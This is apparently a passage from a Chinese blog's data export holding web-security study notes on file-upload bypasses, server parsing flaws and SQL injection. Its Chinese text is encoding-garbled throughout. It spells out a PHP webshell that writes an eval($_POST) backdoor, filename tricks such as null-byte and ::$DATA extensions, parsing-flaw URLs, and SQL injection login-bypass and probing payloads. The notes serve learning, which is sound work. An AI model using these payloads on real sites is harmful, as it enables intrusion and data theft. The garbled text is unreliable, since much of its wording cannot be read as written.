æ³¨å…¥ï¼‰2ã€äºŒæ¬¡æ¸²æŸ“ æ–‡ä»¶åŠ è½½æ£€ç»•è¿‡é€šè¿‡ä¾‹å¦‚åŠ è½½æ–‡ä»¶è¿›è¡Œå›¾åƒæ¸²æŸ“çš„æ–¹å¼æ¥æµ‹è¯•ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¸€èˆ¬éœ€è¦åœ¨æ­£å¸¸çš„æ–‡ä»¶ä¸­æ’å…¥æœ¨é©¬ä»£ç äº†ï¼Œä¾‹å¦‚å›¾åƒï¼Œé‚£ä¹ˆæ’å…¥çš„ä»£ç ä¸€èˆ¬ä¼šæ”¾åœ¨å›¾åƒçš„æ³¨é‡ŠåŒºï¼Œå› æ­¤ä¸ä¼šå½±å“å›¾åƒæ­£å¸¸æ¸²æŸ“ç»•è¿‡è¿™ç§æ£€æµ‹ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨å·¥å…·ï¼ˆç§°ä¸ºæ’é©¬å™¨ï¼‰æ¥è¿›è¡Œæ’å…¥ï¼Œä¾‹å¦‚edjpgcomï¼Œæˆ–è€…ç›´æ¥ç”¨copyå‘½ä»¤æ¥åˆæˆä¹Ÿå¯ä»¥ã€‚å½“ç„¶è¿™ç§æ£€æµ‹ä¸ä¸€å®šèƒ½å¤Ÿå®Œå…¨ç»•è¿‡ åç¼€åé»‘åå•æ ¡éªŒã€åç¼€åç™½åå•æ ¡éªŒï¼šåç¼€åæ£€æµ‹ åç¼€é»‘åå•æ£€æµ‹ç»•è¿‡ï¼šæ‰¾æŸ¥blacklist(é»‘åå•åˆ—è¡¨)çš„æ¼ç½‘ä¹‹é±¼ï¼Œä¾‹å¦‚å¤§å°å†™ï¼šå¦‚æœæ£€æµ‹çš„æ—¶å€™ä¸å¿½ç•¥å¤§å°å†™ï¼Œé‚£ä¹ˆå¯ä»¥æ”¹å˜åç¼€åçš„å¤§å°å†™ç»•è¿‡æ‰©å±•åï¼šé»‘åå•ä¸­å¦‚æœå¿½ç•¥äº†æŸäº›èƒ½è¢«è§£æçš„æ–‡ä»¶æ‰©å±•åï¼š jsp jspx jspf asp asa cer aspx php php php3 php4 pht php5 exe exee åç¼€ç™½åå•æ£€æµ‹ç»•è¿‡ï¼šç™½åå•æ£€æµ‹è¿˜æ˜¯ä¼šæ¯”é»‘åå•å¼ºä¸€ç‚¹ï¼Œå¸¸è§çš„ç»•è¿‡æ–¹æ³•æœ‰%00æˆªæ–­ï¼Œè¿˜æœ‰æœåŠ¡å™¨çš„è§£ææ¼æ´%00æˆªæ–­æ¼æ´ï¼šå¦‚æœå­˜åœ¨è¿™ç±»æ¼æ´ï¼Œé‚£ä¹ˆåç¼€åçš„æ£€æµ‹éƒ½å¯ä»¥ç»•è¿‡ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å¦‚ä¸‹å‘½åä¸€ä¸ªä¸Šä¼ æ–‡ä»¶ test.php%00.jpg æ“ä½œç³»ç»Ÿç›¸å…³ç»•è¿‡ï¼šä¸Šä¼ ä¸ç¬¦åˆwindowsæ–‡ä»¶å‘½åè§„åˆ™çš„æ–‡ä»¶å test.asp.ï¼ˆwindowsçš„ç»“å°¾é»˜è®¤ä¸ä¸ºä¸º.ä¼šè‡ªåŠ¨æ¶ˆæ‰è¿™ä¸ªç‚¹ï¼‰test.asp(ç©ºæ ¼)test.php:1.jpgtest.php::$DATAshell.php::$DATAâ€¦â€¦.ä¼šè¢«æŸäº›ç‰ˆæœ¬çš„windowsç³»ç»Ÿè‡ªåŠ¨å»æ‰ä¸ç¬¦åˆè§„åˆ™ç¬¦å·åé¢çš„å†…å®¹ã€‚ linuxä¸‹åç¼€åå¤§å°å†™ï¼šlinuxæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œå› æ­¤ä¸€èˆ¬æ£€æµ‹ä¹Ÿä¼šåŒºåˆ†å¤§å°å†™ï¼Œä½†æŸäº›è§£æå™¨æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œä¾‹å¦‚PHPï¼Œä¸Šä¼ phpä¸è¢«è§£æï¼Œå¯ä»¥è¯•è¯•ä¸Šä¼ pHpåç¼€çš„æ–‡ä»¶åã€‚ ç«äº‰æ¡ä»¶æ”»å‡»ï¼šä¸€äº›ç½‘ç«™ä¸Šä¼ æ–‡ä»¶é€»è¾‘ä¸Šæ˜¯å…è®¸ä¸Šä¼ ä»»æ„æ–‡ä»¶çš„ï¼Œç„¶åæ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹æ˜¯å¦åŒ…å«webshellè„šæœ¬ï¼Œå¦‚æœåŒ…å«åˆ™åˆ é™¤è¯¥æ–‡ä»¶ï¼Œè¿™é‡Œå­˜åœ¨çš„é—®é¢˜æ˜¯æ–‡ä»¶ä¸Šä¼ æˆåŠŸä¹‹åå’Œåˆ é™¤æ–‡ä»¶ä¹‹é—´å­˜åœ¨ä¸€ä¸ªçŸ­çš„æ—¶é—´å·®ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®æ¥ä¸Šä¼ æ¼æ´æ”»å‡»ã€‚æ”»å‡»è€…å…ˆä¸Šä¼ ä¸€ä¸ªwebshellè„šæœ¬1.phpå†…å®¹å¦‚ä¸‹ï¼š &lt;?php fputs(fopen(â€˜../shell.phpâ€™,â€™wâ€™),â€™&lt;?php @eval($_POST[a]) ?&gt;â€™); ?&gt;ä»£ç å†…å®¹å°±æ˜¯ç”Ÿæˆä¸€ä¸ªæ–°çš„webshellï¼Œshell.phpï¼Œé‚£ä¹ˆå½“1.phpä¸Šä¼ æˆåŠŸä¹‹åï¼Œæˆ‘ä»¬å¿«é€Ÿè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™æ—¶å°±ä¼šåœ¨æœåŠ¡å™¨ç«¯å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨ç”Ÿæˆshell.phpï¼Œè¿™æ—¶å°±åˆ©ç”¨æ—¶é—´å·®å®Œæˆäº†webshellçš„ä¸Šä¼ ã€‚ CMSã€ç¼–è¾‘å™¨æ¼æ´CMSæ¼æ´ï¼š å¯ä»¥é’ˆå¯¹ä¸åŒCMSå­˜åœ¨çš„ä¸Šä¼ æ¼æ´è¿›è¡Œç»•è¿‡ã€‚ç¼–è¾‘å™¨æ¼æ´ï¼šæ¯”å¦‚FCKï¼Œewebeditorç­‰ï¼Œå¯ä»¥é’ˆå¯¹ç¼–è¾‘å™¨çš„æ¼æ´è¿›è¡Œç»•è¿‡ã€‚å‚è€ƒé“¾æ¥ï¼šhttps://www.leavesongs.com/PENETRATION/UseOfFckeditor.htmlhttps://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1 WAFæ ¡éªŒï¼šå³ä½¿ç”¨ä¸åŒçš„WAFäº§å“æ¥è¿›è¡Œè¿‡æ»¤ï¼Œé€šå¸¸æ˜¯ç‹¬ç«‹ä¸æœåŠ¡ç¨‹åºçš„ä¸€æ®µä¸­é—´ç¨‹åºæˆ–è€…ç¡¬ä»¶ WAFç»•è¿‡ï¼šå‚è€ƒé“¾æ¥ï¼šhttps://www.freebuf.com/articles/web/160175.html è§£ææ¼æ´ï¼šè¿™ç±»æ¼æ´æ˜¯æœ¬èº«æœåŠ¡å™¨çš„ä¸­é—´ä»¶äº§ç”Ÿçš„ï¼Œä¾‹å¦‚apacheï¼Œnginxéƒ½è¢«çˆ†å‡ºè¿‡å­˜åœ¨è§£ææ¼æ´ï¼Œå­˜åœ¨è§£ææ¼æ´çš„è¯ï¼Œä¸Šä¼ çš„å®‰å…¨æ€§å‡ ä¹å°±å®Œå…¨å¤±å»äº†ï¼Œä¸‹é¢å†è¯¦ç»†åˆ†æã€‚ æœåŠ¡å™¨è§£ææ¼æ´ IS5.x-6.xè§£ææ¼æ´ä½¿ç”¨iis5.x-6.xç‰ˆæœ¬çš„æœåŠ¡å™¨ï¼Œå¤§å¤šä¸ºwindows server 2003ï¼Œç½‘ç«™æ¯”è¾ƒå¤è€ï¼Œå¼€å‘è¯­å¥ä¸€èˆ¬ä¸ºaspï¼›è¯¥è§£ææ¼æ´ä¹Ÿåªèƒ½è§£æaspæ–‡ä»¶ï¼Œè€Œä¸èƒ½è§£æaspxæ–‡ä»¶ã€‚ ç›®å½•è§£æ(6.0)å½¢å¼ï¼šwww.xxx.com/xx.asp/xx.jpg åŸç†: æœåŠ¡å™¨é»˜è®¤ä¼šæŠŠ.aspï¼Œ.aspç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶ã€‚ æ–‡ä»¶è§£æå½¢å¼ï¼šwww.xxx.com/xx.asp;.jpg åŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·åé¢çš„å†…å®¹ï¼Œå› æ­¤xx.asp;.jpgä¾¿è¢«è§£ææˆaspæ–‡ä»¶äº†ã€‚ è§£ææ–‡ä»¶ç±»å‹ IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§ :/test.asa/test.cer/test.cdx apacheè§£ææ¼æ´æ¼æ´åŸç† Apache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚ test.php.qwe.asd â€œ.qweâ€å’Œâ€.asdâ€ è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸å¯è¯†åˆ«è§£æ,apacheå°±ä¼šæŠŠwooyun.php.qwe.asdè§£ææˆphpã€‚ æ¼æ´å½¢å¼ www.xxxx.xxx.com/test.php.php123å…¶ä½™é…ç½®é—®é¢˜å¯¼è‡´æ¼æ´ å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddHandler php5-script .php è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å«.php å³ä½¿æ–‡ä»¶åæ˜¯ test2.php.jpg ä¹Ÿä¼šä»¥ php æ¥æ‰§è¡Œã€‚ å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddType application/x-httpd-php .jpg å³ä½¿æ‰©å±•åæ˜¯ jpgï¼Œä¸€æ ·èƒ½ä»¥ php æ–¹å¼æ‰§è¡Œã€‚ nginxè§£ææ¼æ´æ¼æ´åŸç† Nginxé»˜è®¤æ˜¯ä»¥CGIçš„æ–¹å¼æ”¯æŒPHPè§£æçš„ï¼Œæ™®éçš„åšæ³•æ˜¯åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­é€šè¿‡æ­£åˆ™åŒ¹é…è®¾ç½® SCRIPT_FILENAMEã€‚å½“è®¿é—® www.xx.com/phpinfo.jpg/1.phpè¿™ä¸ªURLæ—¶ï¼Œ $fastcgi_script_nameä¼šè¢«è®¾ç½®ä¸º â€œphpinfo.jpg/1.phpâ€ï¼Œç„¶åæ„é€ æˆ SCRIPT_FILENAMEä¼ é€’ç»™PHP CGIï¼Œä½†æ˜¯PHPä¸ºä»€ä¹ˆä¼šæ¥å—è¿™æ ·çš„å‚æ•°ï¼Œå¹¶å°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶è§£æå‘¢?è¿™å°±è¦è¯´åˆ°fix_pathinfoè¿™ä¸ªé€‰é¡¹äº†ã€‚ å¦‚æœå¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘åœ¨PHPä¸­çš„å¦‚ä¸‹é€»è¾‘ï¼š PHPä¼šè®¤ä¸ºSCRIPTFILENAMEæ˜¯phpinfo.jpgï¼Œè€Œ1.phpæ˜¯PATHINFOï¼Œæ‰€ä»¥å°±ä¼šå°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶æ¥è§£æäº† æ¼æ´å½¢å¼ www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg %00.phpwww.xxxx.com/UploadFiles/image/1.jpg/ %20.php å¦å¤–ä¸€ç§æ‰‹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œç„¶åè®¿é—®test.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.phpã€‚ IIS7.5è§£ææ¼æ´ IIS7.5çš„æ¼æ´ä¸nginxçš„ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”±äºphpé…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯äº† cgi.fix_pathinfoï¼Œè€Œè¿™å¹¶ä¸æ˜¯nginxæˆ–è€…iis7.5æœ¬èº«çš„æ¼æ´ã€‚ å‚è€ƒæ–‡ç«  https://www.secpulse.com/archives/95987.htmlhttps://blog.csdn.net/weixin_44119101/article/details/107669831","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[{"name":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","slug":"æ–‡ä»¶ä¸Šä¼ æ¼æ´","permalink":"/tags/æ–‡ä»¶ä¸Šä¼ æ¼æ´/"},{"name":"å­¦ä¹ ","slug":"å­¦ä¹ ","permalink":"/tags/å­¦ä¹ /"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"webå­¦ä¹ ç¬”è®°â€”â€”SQLæ³¨å…¥","slug":"webå­¦ä¹ ç¬”è®°â€”â€”SQLæ³¨å…¥","date":"2021-01-02T16:00:00.000Z","updated":"2021-03-03T14:22:31.424Z","comments":true,"path":"2021/01/03/webå­¦ä¹ ç¬”è®°â€”â€”SQLæ³¨å…¥/","link":"","permalink":"/2021/01/03/webå­¦ä¹ ç¬”è®°â€”â€”SQLæ³¨å…¥/","excerpt":"","text":"SQLäº§ç”ŸåŸç†â€‹ æ‰€è°“SQLæ³¨å…¥ï¼Œå°±æ˜¯é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°Webè¡¨å•é€’äº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚å½“åº”ç”¨ç¨‹åºä½¿ç”¨è¾“å…¥å†…å®¹æ¥æ„é€ åŠ¨æ€sqlè¯­å¥ä»¥è®¿é—®æ•°æ®åº“æ—¶ï¼Œä¼šå‘ç”Ÿsqlæ³¨å…¥æ”»å‡»ã€‚å¦‚æœä»£ç ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹ï¼Œè€Œè¿™äº›å­˜å‚¨è¿‡ç¨‹ä½œä¸ºåŒ…å«æœªç­›é€‰çš„ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²æ¥ä¼ é€’ï¼Œä¹Ÿä¼šå‘ç”Ÿsqlæ³¨å…¥ã€‚ é»‘å®¢é€šè¿‡SQLæ³¨å…¥æ”»å‡»å¯ä»¥æ‹¿åˆ°ç½‘ç«™æ•°æ®åº“çš„è®¿é—®æƒé™ï¼Œä¹‹åä»–ä»¬å°±å¯ä»¥æ‹¿åˆ°ç½‘ç«™æ•°æ®åº“ä¸­æ‰€æœ‰çš„æ•°æ®ï¼Œæ¶æ„çš„é»‘å®¢å¯ä»¥é€šè¿‡SQLæ³¨å…¥åŠŸèƒ½ç¯¡æ”¹æ•°æ®åº“ä¸­çš„æ•°æ®ç”šè‡³ä¼šæŠŠæ•°æ®åº“ä¸­çš„æ•°æ®æ¯åæ‰ â€‹ é€šè¿‡æ„å»ºç‰¹æ®Šçš„è¾“å…¥ä½œä¸ºå‚æ•°ä¼ å…¥Webåº”ç”¨ç¨‹åºï¼Œè€Œè¿™äº›è¾“å…¥å¤§éƒ½æ˜¯SQLè¯­æ³•é‡Œçš„ä¸€äº›ç»„åˆï¼Œé€šè¿‡æ‰§è¡ŒSQLè¯­å¥è¿›è€Œæ‰§è¡Œæ”»å‡»è€…æ‰€è¦çš„æ“ä½œï¼Œå…¶ä¸»è¦åŸå› æ˜¯ç¨‹åºæ²¡æœ‰ç»†è‡´åœ°è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œè‡´ä½¿éæ³•æ•°æ®ä¾µå…¥ç³»ç»Ÿã€‚ â€‹ æ ¹æ®ç›¸å…³æŠ€æœ¯åŸç†ï¼ŒSQLæ³¨å…¥å¯ä»¥åˆ†ä¸ºå¹³å°å±‚æ³¨å…¥å’Œä»£ç å±‚æ³¨å…¥ã€‚å‰è€…ç”±ä¸å®‰å…¨çš„æ•°æ®åº“é…ç½®æˆ–æ•°æ®åº“å¹³å°çš„æ¼æ´æ‰€è‡´ï¼›åè€…ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜å¯¹è¾“å…¥æœªè¿›è¡Œç»†è‡´åœ°è¿‡æ»¤ï¼Œä»è€Œæ‰§è¡Œäº†éæ³•çš„æ•°æ®æŸ¥è¯¢ã€‚åŸºäºæ­¤ï¼ŒSQLæ³¨å…¥çš„äº§ç”ŸåŸå› é€šå¸¸è¡¨ç°åœ¨ä»¥ä¸‹å‡ æ–¹é¢ï¼šâ‘ ä¸å½“çš„ç±»å‹å¤„ç†ï¼›â‘¡ä¸å®‰å…¨çš„æ•°æ®åº“é…ç½®ï¼›â‘¢ä¸åˆç†çš„æŸ¥è¯¢é›†å¤„ç†ï¼›â‘£ä¸å½“çš„é”™è¯¯å¤„ç†ï¼›â‘¤è½¬ä¹‰å­—ç¬¦å¤„ç†ä¸åˆé€‚ï¼›â‘¥å¤šä¸ªæäº¤å¤„ç†ä¸å½“ã€‚ SQLæ³¨å…¥æ–¹æ³•ç†è§£1.æ•°å­—æ³¨å…¥ åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ï¼šlearn.me/sql/article.php?id=1ï¼Œè¿™æ˜¯ä¸€ä¸ªgetå‹æ¥å£ï¼Œå‘é€è¿™ä¸ªè¯·æ±‚ç›¸å½“äºè°ƒç”¨ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ï¼š $sql = &quot;SELECT * FROM article WHERE id =&quot;,$id æ­£å¸¸æƒ…å†µä¸‹ï¼Œåº”è¯¥è¿”å›ä¸€ä¸ªid=1çš„æ–‡ç« ä¿¡æ¯ã€‚é‚£ä¹ˆï¼Œå¦‚æœåœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ï¼šlearn.me/sql/article.php?id=-1 OR 1 =1ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªSQLæ³¨å…¥æ”»å‡»äº†ï¼Œå¯èƒ½ä¼šè¿”å›æ‰€æœ‰æ–‡ç« çš„ç›¸å…³ä¿¡æ¯ã€‚ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºï¼Œid = -1æ°¸è¿œæ˜¯falseï¼Œ1=1æ°¸è¿œæ˜¯trueï¼Œæ‰€æœ‰æ•´ä¸ªwhereè¯­å¥æ°¸è¿œæ˜¯tureï¼Œæ‰€ä»¥whereæ¡ä»¶ç›¸å½“äºæ²¡æœ‰åŠ whereæ¡ä»¶ï¼Œé‚£ä¹ˆæŸ¥è¯¢çš„ç»“æœç›¸å½“äºæ•´å¼ è¡¨çš„å†…å®¹ã€‚ï¼ˆå±ï¼‰ 2.å­—ç¬¦ä¸²æ³¨å…¥ æœ‰è¿™æ ·ä¸€ä¸ªç”¨æˆ·ç™»å½•åœºæ™¯ï¼šç™»å½•ç•Œé¢åŒ…æ‹¬ç”¨æˆ·åå’Œå¯†ç è¾“å…¥æ¡†ï¼Œä»¥åŠæäº¤æŒ‰é’®ã€‚è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œæäº¤ã€‚ è¿™æ˜¯ä¸€ä¸ªpostè¯·æ±‚ï¼Œç™»å½•æ—¶è°ƒç”¨æ¥å£learn.me/sql/login.htmlï¼Œé¦–å…ˆè¿æ¥æ•°æ®åº“ï¼Œç„¶ååå°å¯¹postè¯·æ±‚å‚æ•°ä¸­æºå¸¦çš„ç”¨æˆ·åã€å¯†ç è¿›è¡Œå‚æ•°æ ¡éªŒï¼Œå³sqlçš„æŸ¥è¯¢è¿‡ç¨‹ã€‚å‡è®¾æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ä¸ºuserå’Œpwd123ï¼Œè¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ã€æäº¤ï¼Œç›¸å½“äºè°ƒç”¨äº†ä»¥ä¸‹çš„SQLè¯­å¥ï¼š SELECT * FROM user WHERE username = &#39;user&#39; ADN password = &#39;pwd123&#39; â€‹ ç”±äºç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯å­—ç¬¦ä¸²ï¼ŒSQLæ³¨å…¥æ–¹æ³•å³æŠŠå‚æ•°æºå¸¦çš„æ•°æ®å˜æˆmysqlä¸­æ³¨é‡Šçš„å­—ç¬¦ä¸²ã€‚mysqlä¸­æœ‰2ç§æ³¨é‡Šçš„æ–¹æ³•ï¼š ï¼ˆ1ï¼‰â€™#â€™ï¼šâ€™#â€™åæ‰€æœ‰çš„å­—ç¬¦ä¸²éƒ½ä¼šè¢«å½“æˆæ³¨é‡Šæ¥å¤„ç† ç”¨æˆ·åè¾“å…¥ï¼šuserâ€™#ï¼ˆå•å¼•å·é—­åˆuserå·¦è¾¹çš„å•å¼•å·ï¼‰ï¼Œå¯†ç éšæ„è¾“å…¥ï¼Œå¦‚ï¼š111ï¼Œç„¶åç‚¹å‡»æäº¤æŒ‰é’®ã€‚ç­‰ä»·äºSQLè¯­å¥ï¼š SELECT * FROM user WHERE username = &#39;user&#39;#&#39;ADN password = &#39;111&#39; â€˜#â€™åé¢éƒ½è¢«æ³¨é‡Šæ‰äº†ï¼Œç›¸å½“äºï¼š SELECT * FROM user WHERE username = &#39;user&#39; ï¼ˆ2ï¼‰â€™â€“ â€˜ ï¼ˆâ€“åé¢æœ‰ä¸ªç©ºæ ¼ï¼‰ï¼šâ€™â€“ â€˜åé¢çš„å­—ç¬¦ä¸²éƒ½ä¼šè¢«å½“æˆæ³¨é‡Šæ¥å¤„ç† ç”¨æˆ·åè¾“å…¥ï¼šuserâ€™â€“ ï¼ˆæ³¨æ„â€“åé¢æœ‰ä¸ªç©ºæ ¼ï¼Œå•å¼•å·é—­åˆuserå·¦è¾¹çš„å•å¼•å·ï¼‰ï¼Œå¯†ç éšæ„è¾“å…¥ï¼Œå¦‚ï¼š111ï¼Œç„¶åç‚¹å‡»æäº¤æŒ‰é’®ã€‚ç­‰ä»·äºSQLè¯­å¥ï¼š SELECT * FROM user WHERE username = &#39;user&#39;-- &#39;AND password = &#39;111&#39; SELECT * FROM user WHERE username = â€˜userâ€™â€“ â€˜AND password = â€˜1111â€™ â€˜â€“ â€˜åé¢éƒ½è¢«æ³¨é‡Šæ‰äº†ï¼Œç›¸å½“äºï¼š SELECT * FROM user WHERE username = &#39;user&#39; å› æ­¤ï¼Œä»¥ä¸Šä¸¤ç§æƒ…å†µå¯èƒ½è¾“å…¥ä¸€ä¸ªé”™è¯¯çš„å¯†ç æˆ–è€…ä¸è¾“å…¥å¯†ç å°±å¯ç™»å½•ç”¨æˆ·åä¸ºâ€™userâ€™çš„è´¦å·ï¼Œè¿™æ˜¯ååˆ†å±é™©çš„äº‹æƒ…ã€‚ SQLæ³¨å…¥ç‚¹åˆ¤æ–­åˆ†ç±» 1ã€å¸¸è§çš„sqlæ³¨å…¥æŒ‰ç…§å‚æ•°ç±»å‹å¯åˆ†ä¸ºä¸¤ç§ï¼šæ•°å­—å‹å’Œå­—ç¬¦å‹ã€‚ å½“å‘ç”Ÿæ³¨å…¥ç‚¹çš„å‚æ•°ä¸ºæ•´æ•°æ—¶ï¼Œæ¯”å¦‚ IDï¼Œnumï¼Œpageç­‰ï¼Œè¿™ç§å½¢å¼çš„å°±å±äºæ•°å­—å‹æ³¨å…¥æ¼æ´ã€‚åŒæ ·ï¼Œå½“æ³¨å…¥ç‚¹æ˜¯å­—ç¬¦ä¸²æ—¶ï¼Œåˆ™ç§°ä¸ºå­—ç¬¦å‹æ³¨å…¥ï¼Œå­—ç¬¦å‹æ³¨å…¥éœ€è¦å¼•å·æ¥é—­åˆã€‚ 2ã€ä¹Ÿå¯ä»¥æ ¹æ®æ•°æ®åº“è¿”å›çš„ç»“æœï¼Œåˆ†ä¸ºå›æ˜¾æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥ã€ç›²æ³¨ã€‚ å›æ˜¾æ³¨å…¥ï¼šå¯ä»¥ç›´æ¥åœ¨å­˜åœ¨æ³¨å…¥ç‚¹çš„å½“å‰é¡µé¢ä¸­è·å–è¿”å›ç»“æœã€‚ æŠ¥é”™æ³¨å…¥ï¼šç¨‹åºå°†æ•°æ®åº“çš„è¿”å›é”™è¯¯ä¿¡æ¯ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œè™½ç„¶æ²¡æœ‰è¿”å›æ•°æ®åº“çš„æŸ¥è¯¢ç»“æœï¼Œä½†æ˜¯å¯ä»¥æ„é€ ä¸€äº›æŠ¥é”™è¯­å¥ä»é”™è¯¯ä¿¡æ¯ä¸­è·å–æƒ³è¦çš„ç»“æœã€‚ ç›²æ³¨ï¼šç¨‹åºåç«¯å±è”½äº†æ•°æ®åº“çš„é”™è¯¯ä¿¡æ¯ï¼Œæ²¡æœ‰ç›´æ¥æ˜¾ç¤ºç»“æœä¹Ÿæ²¡æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œåªèƒ½é€šè¿‡æ•°æ®åº“çš„é€»è¾‘å’Œå»¶æ—¶å‡½æ•°æ¥åˆ¤æ–­æ³¨å…¥çš„ç»“æœã€‚æ ¹æ®è¡¨ç°å½¢å¼çš„ä¸åŒï¼Œç›²æ³¨åˆåˆ†ä¸ºbased booleanå’Œbased timeä¸¤ç§ç±»å‹ã€‚ 3ã€æŒ‰ç…§æ³¨å…¥ä½ç½®åŠæ–¹å¼ä¸åŒåˆ†ä¸ºï¼špostæ³¨å…¥ï¼Œgetæ³¨å…¥ï¼Œcookieæ³¨å…¥ï¼Œç›²æ³¨ï¼Œå»¶æ—¶æ³¨å…¥ï¼Œæœç´¢æ³¨å…¥ï¼Œbase64æ³¨å…¥ï¼Œæ— è®ºæ­¤ç§åˆ†ç±»å¦‚ä½•å¤šï¼Œéƒ½å¯ä»¥å½’çº³ä¸ºä»¥ä¸Šä¸¤ç§å½¢å¼ã€‚ åˆ¤æ–­ GETæ³¨å…¥ 1ã€æ•°å­—å‹ï¼š çŒœæµ‹SQLè¯­å¥ï¼š select å­—æ®µå from è¡¨å where id = 1ï¼› http://www.sql.com/xxx.php?id=1 å‡è®¾IDä¸ºå­˜åœ¨æ³¨å…¥çš„å‚æ•° http://www.sql.com/xxx.php?id=1â€˜ è¯­å¥æŠ¥é”™ http://www.sql.com/xxx.php?id=1 and 1=1 é¡µé¢æ­£å¸¸è¿”å›ç»“æœ http://www.sql.com/xxx.php?id=1 and 1=2 é¡µé¢è¿”å›é”™è¯¯ 1234 å¦‚æœä»¥ä¸Šå‡ ä¸ªæµ‹è¯•æ­¥éª¤ç»“æœå…¨éƒ¨æ»¡è¶³ï¼Œå°±å¯èƒ½å­˜åœ¨sqlæ³¨å…¥æ¼æ´ã€‚ æ•°å­—å‹æ³¨å…¥ä¸€èˆ¬å‡ºç°åœ¨aspï¼Œphpç­‰å¼±ç±»å‹è¯­è¨€ä¸­ï¼Œå¼±ç±»å‹è¯­è¨€ä¼šè‡ªåŠ¨æ¨å¯¼å˜é‡ç±»å‹ï¼Œä¾‹å¦‚ï¼Œå‚æ•°id=1ï¼ŒPHPä¼šè‡ªåŠ¨æŠŠIDçš„æ•°æ®ç±»å‹æ¨å¯¼ä¸ºintç±»å‹ï¼Œè‹¥æ˜¯ id=1 and 1=1ï¼Œåˆ™æŠŠIDæ¨å¯¼ä¸ºstringç±»å‹ã€‚ä½†æ˜¯å¯¹äºJavaã€c#è¿™ç±»å¼ºç±»å‹è¯­è¨€ï¼Œå¦‚æœæŠŠä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢ä¸ºintç±»å‹ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ— æ³•è¿è¡Œï¼Œæ‰€ä»¥æ•°å­—å‹æ³¨å…¥ä¸€èˆ¬å‡ºç°åœ¨å¼±ç±»å‹çš„è¯­è¨€å½“ä¸­ï¼Œå¼ºç±»å‹è¯­è¨€å¾ˆå°‘å­˜åœ¨ã€‚ 2ã€å­—ç¬¦å‹ï¼š çŒœæµ‹SQLè¯­å¥ï¼š select å­—æ®µå from è¡¨å where id =â€˜ï¼› http://www.sql.com/xxx.php?id=1 å‡è®¾IDä¸ºå­˜åœ¨æ³¨å…¥çš„å‚æ•° http://www.sql.com/xxx.php?id=1â€˜ è¯­å¥æŠ¥é”™ http://www.sql.com/xxx.php?id=1&#39; and 1=1 and &#39;1&#39;=&#39;1 é¡µé¢æ­£å¸¸è¿”å›ç»“æœ http://www.sql.com/xxx.php?id=1&#39; and 1=2 and 